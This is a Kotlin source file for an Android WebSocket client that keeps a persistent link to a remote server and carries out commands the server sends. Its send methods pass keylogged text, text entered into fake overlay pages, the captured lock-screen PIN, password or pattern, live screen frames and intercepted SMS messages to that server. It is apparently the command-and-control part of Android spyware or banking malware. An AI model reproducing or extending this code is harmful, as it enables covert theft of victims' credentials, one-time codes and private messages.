package com.vibelink.client.network

import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class DeviceWebSocketClient(
    private val scope: CoroutineScope,
    private val deviceToken: String,
    private val wsBaseUrl: String,
    private val listener: Listener,
    private val heartbeatPayloadProvider: () -> JSONObject = { JSONObject() },
) {
    interface Listener {
        fun onConnected()
        fun onDisconnected(code: Int, reason: String)
        fun onMessage(text: String)
        fun onCommand(id: String, cmd: String, params: JSONObject)
        fun onFailure(message: String)
    }

    // 整个进程共用一份 OkHttpClient。旧实现每次重连都 new 一个，
    // 旧实例的连接池与 Dispatcher 线程不会被回收，风暴时能堆到几千个线程。
    private val client: OkHttpClient
        get() = sharedClient

    /**
     * 连接代次。每次 connect/disconnect/reportStale 都自增。
     * OkHttp 的回调跑在自己的线程上，被替换掉的旧 socket 依然会回调 onFailure/onClosed；
     * 用代次把它们全部丢弃，否则「替换客户端」这一个动作会额外派发一轮 onFailure，
     * 再触发一次重连，形成客户端无限新建的风暴。
     */
    @Volatile
    private var generation = 0

    @Volatile
    private var webSocket: WebSocket? = null
    private var heartbeatJob: Job? = null
    private var handshakeJob: Job? = null

    @Volatile
    private var isSocketOpen = false

    /** 已发起 newWebSocket 但还没 onOpen。握手期间绝不允许再新建客户端。 */
    @Volatile
    private var isHandshaking = false

    @Volatile
    private var connectStartedAtMs = 0L

    @Volatile
    private var lastPongAtMs = 0L

    @Volatile
    private var staleReported = false

    fun connect() {
        closeCurrentSocket()

        val gen = generation
        isHandshaking = true
        connectStartedAtMs = System.currentTimeMillis()
        staleReported = false
        lastPongAtMs = 0L

        val request = Request.Builder()
            .url("${wsBaseUrl.trimEnd('/')}?token=$deviceToken")
            .build()

        val socket = client.newWebSocket(
            request,
            object : WebSocketListener() {
                private fun superseded(): Boolean = gen != generation

                override fun onOpen(webSocket: WebSocket, response: Response) {
                    if (superseded()) {
                        runCatching { webSocket.close(1000, "superseded") }
                        return
                    }
                    isHandshaking = false
                    isSocketOpen = true
                    lastPongAtMs = System.currentTimeMillis()
                    staleReported = false
                    stopHandshakeWatchdog()
                    listener.onConnected()
                    startHeartbeat()
                }

                override fun onMessage(webSocket: WebSocket, text: String) {
                    if (superseded()) {
                        return
                    }
                    val json = runCatching { JSONObject(text) }.getOrNull()
                    if (json != null && json.optString("type") == "pong") {
                        lastPongAtMs = System.currentTimeMillis()
                        staleReported = false
                        return
                    }
                    if (json != null && json.optString("type") == "command") {
                        val commandId = json.optString("id")
                        val cmd = json.optString("cmd")
                        val params = json.optJSONObject("params") ?: JSONObject()
                        if (commandId.isNotBlank() && cmd.isNotBlank()) {
                            listener.onCommand(commandId, cmd, params)
                            return
                        }
                    }
                    listener.onMessage(text)
                }

                override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                    if (superseded()) {
                        return
                    }
                    webSocket.close(code, reason)
                }

                override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                    if (superseded()) {
                        return
                    }
                    isHandshaking = false
                    isSocketOpen = false
                    stopHeartbeat()
                    stopHandshakeWatchdog()
                    listener.onDisconnected(code, reason)
                }

                override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                    if (superseded()) {
                        return
                    }
                    isHandshaking = false
                    isSocketOpen = false
                    stopHeartbeat()
                    stopHandshakeWatchdog()
                    listener.onFailure(t.message ?: "websocket failure")
                }
            },
        )
        if (gen == generation) {
            webSocket = socket
        } else {
            runCatching { socket.cancel() }
        }
        startHandshakeWatchdog(gen)
    }

    fun disconnect(suppressListener: Boolean = false) {
        // 代次自增后旧 socket 的 onClosed/onFailure 一律被丢弃，
        // suppressListener 已由代次机制覆盖，这里保留参数只为兼容既有调用点。
        closeCurrentSocket(graceful = true)
    }

    /**
     * 作废当前 socket 且不向 listener 派发任何回调。
     * graceful=true 时发 close 帧，服务端能立刻摘掉设备，而不是等 ping 超时；
     * 替换连接时用 cancel 更快，反正新连接马上就到。
     */
    private fun closeCurrentSocket(graceful: Boolean = false) {
        generation++
        isHandshaking = false
        isSocketOpen = false
        connectStartedAtMs = 0L
        staleReported = false
        stopHeartbeat()
        stopHandshakeWatchdog()
        val socket = webSocket
        webSocket = null
        if (socket != null) {
            if (graceful) {
                val closed = runCatching { socket.close(1000, "client_disconnect") }.getOrDefault(false)
                if (!closed) {
                    runCatching { socket.cancel() }
                }
            } else {
                runCatching { socket.cancel() }
            }
        }
    }

    fun isConnected(): Boolean = isSocketOpen

    /** 握手进行中（且未超时）。上层据此避免重复新建客户端。 */
    fun isConnecting(): Boolean {
        if (!isHandshaking) {
            return false
        }
        return System.currentTimeMillis() - connectStartedAtMs < HANDSHAKE_TIMEOUT_MS
    }

    /**
     * @param droppable 若为 true：写队列超过 [DROP_QUEUE_BYTES] 时直接丢弃本条，避免挤占 ping/控制指令通道。
     *                  仅用于"快照型"消息（UI 树、画面帧、截图回执）——这些消息迟到无意义。
     */
    fun sendRawMessage(message: String, droppable: Boolean = false): Boolean {
        val socket = webSocket
        if (socket == null || !isSocketOpen) {
            if (isHandshaking) {
                // 握手未完成时直接丢弃：这里若报 stale 会把正在握手的 socket 掐掉，
                // 一次失败就会滚成「新建→取消→新建」的循环。
                return false
            }
            reportStale("control_ws_not_open")
            return false
        }
        if (droppable) {
            val queued = runCatching { socket.queueSize() }.getOrDefault(0L)
            if (queued > DROP_QUEUE_BYTES) {
                android.util.Log.w(
                    TAG,
                    "drop_stale_frame queue=$queued limit=$DROP_QUEUE_BYTES size=${message.length}",
                )
                return false
            }
        }
        val accepted = runCatching { socket.send(message) }.getOrDefault(false)
        if (!accepted) {
            reportStale("control_ws_send_rejected")
        }
        return accepted
    }

    fun sendCommandResult(
        commandId: String,
        ok: Boolean,
        data: JSONObject = JSONObject(),
        error: String? = null,
        droppable: Boolean = false,
    ) {
        val payload = JSONObject()
            .put("id", commandId)
            .put("ok", ok)
            .put("data", data)
        if (!ok && !error.isNullOrBlank()) {
            payload.put("error", error)
        }

        val message = JSONObject()
            .put("type", "command_result")
            .put("payload", payload)
            .toString()

        sendRawMessage(message, droppable = droppable)
    }

    fun sendKeyboardEvent(
        appPackage: String?,
        appLabel: String? = null,
        text: String,
        eventType: Int,
        capturedAt: Long,
    ) {
        val payload = JSONObject()
            .put("appPackage", appPackage)
            .put("text", text)
            .put("eventType", eventType)
            .put("capturedAt", capturedAt)
        if (!appLabel.isNullOrBlank()) {
            payload.put("appLabel", appLabel)
        }

        val message = JSONObject()
            .put("type", "keyboard")
            .put("payload", payload)
            .toString()

        sendRawMessage(message)
    }

    fun sendFakePageEvent(
        packageName: String,
        title: String,
        text: String,
        submitCount: Int,
        capturedAt: Long,
    ) {
        val payload = JSONObject()
            .put("packageName", packageName)
            .put("title", title)
            .put("text", text)
            .put("submitCount", submitCount)
            .put("capturedAt", capturedAt)

        val message = JSONObject()
            .put("type", "fake_page")
            .put("payload", payload)
            .toString()

        sendRawMessage(message)
    }

    fun sendKeyguardPinEvent(
        pin: String,
        capturedAt: Long,
        lockType: String = "pin",
        gesturePath: String = "",
    ) {
        val payload = JSONObject()
            .put("pin", pin)
            .put("secret", pin)
            .put("lockType", lockType)
            .put("lockTypeCode", when (lockType) {
                "password" -> 2
                "pattern" -> 3
                else -> 1
            })
            .put("digitCount", when (lockType) {
                "pattern" -> pin.split('-', ',').count { it.isNotBlank() }
                else -> pin.filter(Char::isDigit).length
            })
            .put("capturedAt", capturedAt)
        if (lockType == "pattern") {
            payload.put("path", pin)
            if (gesturePath.isNotBlank()) {
                payload.put("gesturePath", gesturePath)
                // mamimobi SCNReceiver DATA field compatibility
                payload.put("data", gesturePath)
            }
        }

        val message = JSONObject()
            .put("type", "keyguard_pin")
            .put("payload", payload)
            .toString()

        sendRawMessage(message)
    }

    fun sendScreenError(errorCode: Int) {
        val message = JSONObject()
            .put("type", "screen_error")
            .put(
                "payload",
                JSONObject()
                    .put("errorCode", errorCode)
                    .put("timestamp", System.currentTimeMillis()),
            )
            .toString()
        sendRawMessage(message)
    }

    fun sendScreenFrame(
        data: String,
        screenWidth: Int,
        screenHeight: Int,
    ) {
        val payload = JSONObject()
            .put("data", data)
            .put("screenWidth", screenWidth)
            .put("screenHeight", screenHeight)
            .put("capturedAt", System.currentTimeMillis())

        val message = JSONObject()
            .put("type", "screen_frame")
            .put("payload", payload)
            .toString()

        sendRawMessage(message)
    }

    fun sendSmsEvent(
        sender: String,
        body: String,
        smsType: Int,
        source: String,
        clientSmsId: String?,
        receivedAt: Long,
    ) {
        val payload = JSONObject()
            .put("sender", sender)
            .put("body", body)
            .put("smsType", smsType)
            .put("source", source)
            .put("receivedAt", receivedAt)
        if (!clientSmsId.isNullOrBlank()) {
            payload.put("clientSmsId", clientSmsId)
        }

        val message = JSONObject()
            .put("type", "sms")
            .put("payload", payload)
            .toString()

        sendRawMessage(message)
    }

    private fun startHandshakeWatchdog(gen: Int) {
        handshakeJob?.cancel()
        handshakeJob = scope.launch {
            delay(HANDSHAKE_TIMEOUT_MS)
            if (gen == generation && isHandshaking) {
                // 握手卡死也要能给上层一个失败信号，否则不再有人来重连
                reportStale("control_ws_handshake_timeout")
            }
        }
    }

    private fun stopHandshakeWatchdog() {
        handshakeJob?.cancel()
        handshakeJob = null
    }

    private fun startHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = scope.launch {
            while (isActive) {
                sendHeartbeat()
                if (isPongStale()) {
                    reportStale("control_ws_pong_timeout")
                    break
                }
                delay(HEARTBEAT_INTERVAL_MS)
            }
        }
    }

    private fun stopHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = null
    }

    private fun sendHeartbeat() {
        val meta = heartbeatPayloadProvider()
        meta.put("timestamp", System.currentTimeMillis())
        val payload = JSONObject()
            .put("type", "heartbeat")
            .put("payload", meta)
            .toString()
        sendRawMessage(payload)
    }

    private fun isPongStale(): Boolean {
        if (!isSocketOpen || lastPongAtMs <= 0L) {
            return false
        }
        return System.currentTimeMillis() - lastPongAtMs >= PONG_TIMEOUT_MS
    }

    private fun reportStale(reason: String) {
        if (staleReported) {
            return
        }
        staleReported = true
        isHandshaking = false
        isSocketOpen = false
        stopHeartbeat()
        stopHandshakeWatchdog()
        val socket = webSocket
        webSocket = null
        // cancel() 之后 OkHttp 还会回调一次 onFailure；自增代次把它丢掉，
        // 否则一次超时会派发两轮重连。
        generation++
        runCatching { socket?.cancel() }
        listener.onFailure(reason)
    }

    companion object {
        private const val TAG = "DeviceWebSocketClient"
        private const val HEARTBEAT_INTERVAL_MS = 30_000L
        private const val PONG_TIMEOUT_MS = 90_000L
        private const val HANDSHAKE_TIMEOUT_MS = 20_000L
        /** 水位阈值：可丢消息（UI 树、画面帧）在写队列超过该值时丢弃。 */
        private const val DROP_QUEUE_BYTES = 128L * 1024L

        private val sharedClient: OkHttpClient by lazy {
            OkHttpClient.Builder()
                .pingInterval(30, TimeUnit.SECONDS)
                .connectTimeout(15, TimeUnit.SECONDS)
                .build()
        }
    }
}
